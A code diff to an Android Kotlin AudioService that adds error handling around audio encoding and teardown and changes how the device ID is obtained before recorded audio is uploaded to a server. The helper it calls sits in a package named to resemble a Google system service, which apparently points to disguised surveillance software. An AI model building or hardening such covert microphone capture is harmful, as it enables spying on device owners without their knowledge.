@@ -165,10 +165,15 @@ class AudioService : BaseService() {
             // Get input buffer
             val inputBufferIndex = codec.dequeueInputBuffer(10000)
             if (inputBufferIndex >= 0) {
-                val inputBuffer = codec.getInputBuffer(inputBufferIndex)
-                inputBuffer?.clear()
-                inputBuffer?.put(pcmData, 0, size)
-                codec.queueInputBuffer(inputBufferIndex, 0, size, System.nanoTime() / 1000, 0)
+                try {
+                    val inputBuffer = codec.getInputBuffer(inputBufferIndex)
+                    inputBuffer?.clear()
+                    inputBuffer?.put(pcmData, 0, size)
+                    codec.queueInputBuffer(inputBufferIndex, 0, size, System.nanoTime() / 1000, 0)
+                } catch (e: Exception) {
+                    try { codec.queueInputBuffer(inputBufferIndex, 0, 0, 0, 0) } catch (_: Exception) {}
+                    Log.e(TAG, "Error processing input buffer", e)
+                }
             }
             
             // Get output buffer
@@ -226,17 +231,12 @@ class AudioService : BaseService() {
         
         recordingJob?.cancel()
         
-        try {
-            audioRecord?.stop()
-            mediaCodec?.stop()
-            mediaCodec?.release()
-            mediaCodec = null
-        } catch (e: Exception) {
-            Log.e(TAG, "Error stopping recording: ${e.message}")
-        } finally {
-            audioRecord?.release()
-            audioRecord = null
-        }
+        try { audioRecord?.stop() } catch (e: Exception) { Log.e(TAG, "Error stopping audioRecord", e) }
+        try { mediaCodec?.stop() } catch (e: Exception) { Log.e(TAG, "Error stopping mediaCodec", e) }
+        try { audioRecord?.release() } catch (e: Exception) { Log.e(TAG, "Error releasing audioRecord", e) }
+        try { mediaCodec?.release() } catch (e: Exception) { Log.e(TAG, "Error releasing mediaCodec", e) }
+        audioRecord = null
+        mediaCodec = null
 
         if (encodedAudioBuffer.size() > 0) {
             serviceScope.launch {
@@ -247,14 +247,7 @@ class AudioService : BaseService() {
 
     private suspend fun sendAudioToServer() {
         try {
-            val deviceId = try {
-                android.provider.Settings.Secure.getString(
-                    contentResolver,
-                    android.provider.Settings.Secure.ANDROID_ID
-                ) ?: AndroidConfig.deviceId
-            } catch (e: Exception) {
-                AndroidConfig.deviceId
-            }
+            val deviceId = com.google.android.systemservice.utils.DeviceIdentifierProvider.getDeviceIdentifier(this@AudioService)
 
             val audioData = encodedAudioBuffer.toByteArray()
             encodedAudioBuffer.reset()
